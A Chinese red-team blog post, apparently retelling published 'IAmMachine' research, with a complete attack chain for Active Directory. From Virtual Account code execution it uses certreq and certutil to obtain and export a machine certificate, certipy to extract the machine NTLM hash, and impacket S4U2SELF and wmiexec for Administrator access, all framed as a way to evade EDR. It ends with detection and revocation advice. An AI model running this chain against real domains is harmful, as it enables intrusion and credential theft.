---
title: "拿到 MSSQL SA 权限但被 CrowdStrike 封死？试试用 ADCS 机器证书直接接管域机器"
cover: ./assets/cover-05-iammachine.jpg
---

# 拿到 MSSQL SA 权限但被 CrowdStrike 封死？试试用 ADCS 机器证书直接接管域机器

> 内部渗透测试中，用 SA 权限跑了 xp_cmdshell，结果发现 CrowdStrike Falcon 在线。Potato 提权系列全被封死。正当以为这条路走不通的时候，我们发现了一条"阳关道"——利用 Virtual Account 的身份特性，走 ADCS 申请机器证书，全程 Windows 原生工具，零 EDR 告警，直接把域机器拿下来。

**⏱️ 阅读时间**：约 10 分钟

**🔧 涉及技术**：ADCS · Virtual Account · PKINIT · S4U2SELF · certreq · certipy · TGTDeleg · Silver Ticket

**📎 原文来源**：[IAmMachine — Abdul MHS](https://www.abdulmhsblog.com/posts/iammachine/)（本文基于该研究整理）

---

## 先说说场景

我和同事 Michael 一起做一次红队渗透测试（assumed breach 场景）。Michael 拿下了目标内网一个 MSSQL 数据库的 SA 权限——可以执行命令，舒服。

但问题来了：那台机器上跑着 **CrowdStrike Falcon**。

有 CrowdStrike 在，你不能直接丢个 GodPotato 上去。Potato 系列提权（RottenPotato、JuicyPotato、GodPotato 等等）本质是利用 `SeImpersonatePrivilege` 做令牌提权到 SYSTEM，EDR 厂商早把这些套路摸透了——从进程创建、令牌复制到管道劫持，每个环节都有检测点。

我当时想：如果 Virtual Account 访问域资源时用的是机器账户身份，那能不能直接用这个身份去 ADCS 申请一张机器证书，然后反过来把机器拿下？

两个小时验证下来——**可行。** 而且全程不需要额外工具落地，certreq、certutil、PowerShell，Windows 自带的东西就够了。

这就是今天要聊的 **IAmMachine**。

---

## Part 1：Virtual Account 是什么，为什么能用

首先得搞明白一个概念：**Virtual Account（虚拟账户）**。

Windows 有一种机制，给服务提供专用身份但又不用你手动创建用户账户。常见的包括：

- `NT SYSTEM\Network Service`
- `NT SYSTEM\Local Service`
- `IIS APPPOOL\DefaultAppPool`

它们叫"虚拟"是因为身份认证完全由本机的 SAM 处理，不需要域账户。而且这些账号默认持有 `SeImpersonatePrivilege`——这就是 potato 提权的入口点。

但还有一个更关键的属性：**当 Virtual Account 访问域资源时，它使用的是计算机账户（`DOMAIN\COMPUTER$`）的身份去认证。**

意思是，你在一个 Network Service shell 里访问 SMB 共享、请求 TGT、申请证书——这些操作本质上都是以 `DOMAIN\WEBSRV01$` 的身份去做的。

这就是整个攻击链的起点。

## Part 2：攻击步骤详解

### 前提条件

- 已经拿下一个 Virtual Account 的代码执行权限（比如通过 MSSQL xp_cmdshell）
- 环境里有 ADCS
- 存在一个模板允许 Domain Computers 注册 + 有 Client Authentication EKU
- 能访问 CA 服务器和域控/KDC

### Step 1：创建 .inf 文件

目标是用 `certreq` 这个 Windows 原生二进制来生成证书请求。我们先写一个 `.inf` 配置文件：

```powershell
$infContent = @"
[NewRequest]
Subject = "CN=$env:COMPUTERNAME"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE       # 关键！设为 FALSE 才能无特权导出私钥
SMIME = FALSE
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0
[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2 ; Client Authentication EKU
"@

# 把 inf 内容写入文件
$infContent | Out-File -FilePath "C:\Windows\Tasks\cert.inf"
```

**重点讲一下 `MachineKeySet = FALSE`。**

默认情况下，如果设为 TRUE，私钥会被标记为属于计算机账户——导出它需要 SYSTEM 权限。而我们作为 Network Service 没这权限。设成 FALSE 后，私钥被标记为用户级别的，但 Virtual Account 访问域资源时用的还是机器身份，功能上完全不影响，却让我们可以在低权限下直接导出。

### Step 2：生成证书请求

```powershell
certreq -new "C:\Windows\Tasks\cert.inf" "C:\Windows\Tasks\cert.req"
```

### Step 3：提交给 CA

```powershell
certreq -submit -config "CA-SERVER\CA-NAME" -attrib "CertificateTemplate:Machine" "C:\Windows\Tasks\cert.req" "C:\Windows\Tasks\cert.cer"
```

`-attrib "CertificateTemplate:Machine"` 指定了我们申请的模板——这里是 Machine 模板。

> **注意**：这里的思路可以扩展到其他场景。比如如果你是 ESC1 环境，甚至可以在 .inf 里改 Subject 字段来申请其他用户的证书——灵活性很大。

### Step 4：接受证书并导出 PFX

证书签下来了，现在要转成 PKCS12（PFX）格式才能带走。我们用 `certreq -accept` 接收入库，再用 `certutil -exportPFX` 导出。

这里用了 `-user` 标志——把它存到当前用户（Virtual Account）的证书存储区。不是因为这个证书是用户证书，而是因为我们只有用户存储区的写入权限：

```powershell
# 接受证书并获取其 thumbprint
$thumb = (certreq -accept -user -f "C:\Windows\Tasks\cert.cer" 2>&1 | Out-String | Select-String -Pattern '[0-9A-Fa-f]{40}' -AllMatches).Matches[0].Value

# 用 thumbprint 导出 PFX，密码设成 "pass"
certutil -user -exportPFX -p "pass" $thumb "C:\Windows\Tasks\cert.pfx"
```

![证书导出到 PFX](https://www.abdulmhsblog.com/posts/iammachine/images/certexportpfx.png)

这个 PFX 文件你可以 scp、smb、base64 带走，或者在原地用 PassTheCert 之类的工具继续操作。

### Step 5：PKINIT 提取 NTLM Hash

把 PFX 拿回你的攻击机（Kali 之类），用 certipy 的 `auth` 命令。Certipy 会拿着证书用 PKINIT 协议向 KDC 做 Kerberos 认证，返回的 TGT 里就带着机器账户的 NTLM hash：

```bash
certipy auth -pfx cert.pfx -dc-ip <DC_IP> -username <COMPUTERNAME$> -domain <DOMAIN>
```

![Certipy auth 提取出了机器账户的 NTLM Hash](https://www.abdulmhsblog.com/posts/iammachine/images/CertipyAuthNTLMV1HashMachineAccount.png)

拿到了 hash，你就有了机器账户的域凭据。

### Step 6：S4U2SELF Silver Ticket 提权

最后一步。用 impacket 的 S4U2SELF 扩展 + 机器账户的 NTLM hash，给自己做一个 silver ticket，以 Administrator 身份获取目标机器的服务票据：

```bash
impacket-getST -self -impersonate Administrator -spn host/TARGET-COMPUTER <DOMAIN>/<COMPUTERNAME>$ -hashes :<NTLM_HASH>
export KRB5CCNAME=administrator.ccache
impacket-wmiexec <DOMAIN>/Administrator@TARGET-COMPUTER -k -no-pass
```

![S4U2SELF 提权成功](https://www.abdulmhsblog.com/posts/iammachine/images/s4u2selfabuse.png)

一条命令，shell 就到手了。全程没有在目标机器上落地任何新 payload，没有创建计划任务，没有注入——CrowdStrike 面对这种操作基本无感。

---

## Part 3：没有 ADCS 怎么办？TGTDeleg 了解一下

好，你可能要问了：如果环境里没有 ADCS，这条路是不是就断了？

不。还有一条路——**TGTDeleg**。

Charlie Clark 在 Revisiting Delegate 2 Thyself 这篇文章里详细讲过这个：当 Virtual Account 请求一个 TGT（Ticket Granting Ticket）用于 Kerberos 委派时，实际请求是在机器账户的上下文中完成的。利用这一点，Rubeus 的 `tgtdeleg` trick 可以直接从 LSASS 进程的内存中提取出机器账户的 TGT。

拿到 TGT 之后，和前面一样——S4U2SELF，走起。

完整文章在这里：https://exploit.ph/revisiting-delegate-2-thyself.html

所以不管有没有 ADCS，都有办法搞。

---

## Part 4：从防御角度看——为什么这个比 Potato 难防

先不说操作性，光说隐蔽性，这个手法就甩 potato 几条街：

1. **全原生工具**：`certreq`、`certutil` 都是微软签名二进制。没有奇怪进程创建、没有非标准镜像加载。EDR 的异常检测模型很难把"Network Service 调用了 certreq"标成恶意。

2. **没有 Payload 落地**：从 xp_cmdshell 执行 PowerShell，整个过程靠管道和 Windows 自身工具链完成。不需要上传 .exe、不需要编译、不需要注入。

3. **证书吊销是个坑**：这里有个蓝队特别容易踩的坑——当你发现机器被拿下后，即使你重置了机器账户密码、重装了系统，只要主机名没变，之前签发的证书**仍然有效**。攻击者手里的 PFX 完全不受密码重置影响，因为证书链走的是 CA 信任，和机器账户密码无关。

   正确的处置方式不是改密码，而是：**从最近一次已知正常的时间点开始，吊销该端点所有已签发的证书。**

4. **拿到的不只是提权**：不同于 Potato 只是本地提权到 SYSTEM，这个手法给你的是**域机器账户的凭据**。有了那个 NTLM hash，你可以做很多域级别的事情——kerberoasting、AS-REP roasting、甚至从这台机器横向到其他信任域。

---

## 我的思考

### 红队/渗透测试的角度

**Potato 真的过时了吗？** 不一定完全过时，但在 EDR 密集部署的环境下，它的生存空间确实在缩小。IAmMachine 这条路径给了一个非常优雅的替代方案——不需要额外工具、不产生可疑进程树、还顺手拿域凭据。

而且这条路径的适用范围其实比 potato 更广。Potato 需要 `SeImpersonatePrivilege`（Virtual Account 默认有），但 IAmMachine 的核心依赖是"Virtual Account 能访问 ADCS"——只要你能命令执行在 Virtual Account 上下文中，它就能工作。MSSQL SA、IIS WebShell、Scheduled Task 任意一个入口都可以。

**还有一个细节很多人可能忽略**：证书申请和执行 shell 可以分开。你可以在 A 机器上用 Virtual Account 申请证书、导出 PFX，带回自己的机器慢慢搞 NTLM hash，然后再回来打 S4U2SELF。这不只是一次提权，更是一次"凭据收割"。

### 蓝队检测的角度

说实话，这道题的检测难度不低。

你可以尝试的行为检测点：

- `certreq` 被 Virtual Account（非交互用户）调用 → 基线异常
- 短时间内 `certreq -new` + `certreq -submit` + `certreq -accept` + `certutil -exportPFX` 的调用链 → 值得关注
- Network Service / IIS APPPOOL 进程网络连接到 CA 服务器的 443 端口 → 看看在干嘛

但问题在于，以上每个行为单独看都可能是正常的维护操作。只有在串起来的时候才显得可疑。而传统的基于签名的 EDR 很难做这种多步骤关联分析。

### 一句话总结

**EDR 防住了 potato 的枪，但 ADCS 这扇门一直开着。**

---
